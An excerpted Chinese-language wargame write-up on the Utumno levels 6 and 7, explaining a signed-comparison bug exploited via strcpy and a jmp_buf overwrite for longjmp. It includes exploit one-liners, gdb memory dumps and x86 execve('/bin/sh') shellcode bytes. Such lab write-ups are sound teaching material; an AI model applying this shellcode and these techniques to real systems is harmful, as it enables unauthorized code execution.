...
搜索一番找到这个方法:[Starting program using execv and passing arguments with out raising argc](https://stackoverflow.com/questions/54225622/starting-program-using-execv-and-passing-arguments-with-out-raising-argc)。原理就是参数和环境变量指针数组在内存中的布局：
...
`^`表示异或,这里需要一点数学计算。我们要在返回地址上面写shellcode环境变量中的地址(还好只需要写4个字节,而不是整个shellcode)。异或运算有一个性质为：`a^b^b=a`。用整个性质帮助我们计算需要写的那个数。
...
shellcode之前试过一次，拿不到shell，但发现直接cat可以,上面shellcode是直接cat密码版本,用cat的缺点是复用性比较低。下面让我们用gdb找到环境变量地址。
...
转的过程实际上是将eax的低16位复制过去(ax表示eax的低16位)。所以我们把arg1的低16位全为0的数表示长度就ok了(2**16=65536)。
...
jle是有符号数的比较,但`strtoul`函数返回的是无符号数,也就是说如果输入-1，那么strtoul返回0xffffffff。在比较的时候`if(pos>10)`会为真。

假设我们输入一个负数:

```bash
./utumno6 -1 0x41414141 abcd
```

条件判断是会判断为否的。

观察反汇编(你也可以动态调试)。此时eax=-1,edx=arg2(16进制),我添加了注释。
...
.text:0804857F 038                 mov     eax, [ebp+b.p]  ; 得到b.p存的地址。
.text:08048582 038                 push    edx             ; src
.text:08048583 03C                 push    eax             ; dest
.text:08048584 040                 call    _strcpy ; 将我们的字符串粘贴到b.p所指向的地址上去。
```

b.table 的位置是ebp-48,b.p的位置是`ebp-52`。`ebp+eax*4+b.table`运算出来的结果是`ebp+-1*4-48=ebp-52`，正好是b.p的位置。简单的说：就是说后面strcpy会将你写arg3的内容拷贝到arg2参数所指向的地址上去。

所以在第二个参数里面写栈上的返回地址，第三个参数里面写shellcode地址。开始上号。
...
setjmp,longjmp 函数可以参考[C Language: longjmp function](https://www.techonthenet.com/c_language/standard_library_functions/setjmp_h/longjmp.php)。简单的说，就是调用时setjmp会保存程序现在运行的状态(也就是程序此时的上下文,比如eip),调用longjmp的时候返回longjmp所设置的值,并还原之前保存的程序状态,回光返照。


所以我们需要覆盖局部变量`jmp_buf foo`中所存的eip指针,让其指向我们的shellcode,还不能用栈溢出，因为覆盖返回地址的时候肯定会覆盖到jmp_buf结构中所保存的eip。转到定义，jmp_buf差不多具有以下结构与大小：
...
应该是6个寄存器的值存在这里,直接把6个寄存器的值都写成shllcode的地址,让longjmp还原eip时直接jmp到我们的shellcode地址里面(eip的还原可以直接jmp)。
...
```
./utumno7 $(python -c "print '\x90'*128+'AAAA'*6")
```

直接上号。

```bash
utumno7@utumno:/utumno$  export SHELLCODE=$(python -c 'print 200 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80"')

utumno7@utumno:/utumno$ gdb ./utumno7
...
Breakpoint 1, main (argc=1, argv=0xffffd574) at utumno7.c:32
32	utumno7.c: No such file or directory.
...
0xffffde3c:	0x90909090	0xc0319090	0x2f2f6850	0x2f686873
0xffffde4c:	0x896e6962	0x31c931e3	0x2c0fb0d2	0x0080cd04
0xffffde5c:	0x52455355	0x7574753d	0x376f6e6d	0x44575000
0xffffde6c:	0x74752f3d	0x6f6e6d75	0x4e494c00	0x333d5345
0xffffde7c:	0x4f480030	0x2f3d454d	0x656d6f68	0x7574752f
0xffffde8c:	0x376f6e6d	0x48535300	0x494c435f	0x3d544e45
0xffffde9c:	0x2e333831	0x2e373232	0x2e303032	0x20383931
0xffffdeac:	0x32303131	0x32322032	0x5f434c00	0x52444441
0xffffdebc:	0x3d535345	0x555f6e65	0x54552e53	0x00382d46
0xffffdecc:	0x4e5f434c	0x52454d55	0x653d4349	0x53555f6e
...

```

选`0xffffddcc`这个地址吧，长得很整齐。观察反汇编，buf的位置是ebp+288,开始构造。

```bash
./utumno7 $(python -c "print '\x90'*128+'\xcc\xdd\xff\xff'*6")
...
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80:28
